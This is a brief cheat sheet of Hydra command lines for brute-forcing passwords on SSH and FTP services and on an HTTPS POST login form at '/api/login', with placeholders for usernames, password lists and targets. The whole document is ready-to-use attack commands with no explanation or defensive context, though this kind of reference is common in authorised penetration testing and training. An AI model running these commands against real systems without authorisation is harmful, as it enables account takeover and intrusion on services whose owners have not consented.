SSH bruteforce
hydra -l <username> -P <password_file> <ip> ssh 
hydra -L <username_file> -P <password_file> <ip> ssh

ftp bruteforce
hydra -l <username> -P <password_file> <ip> ftp 
hydra -L <username_file> -P <password_file> <ip> ftp 

http-post
hydra -L <username_file> -P <password_file> <host> https-post-form "/api/login:username=^USER^&password=^PASS^:Incorrect credentials"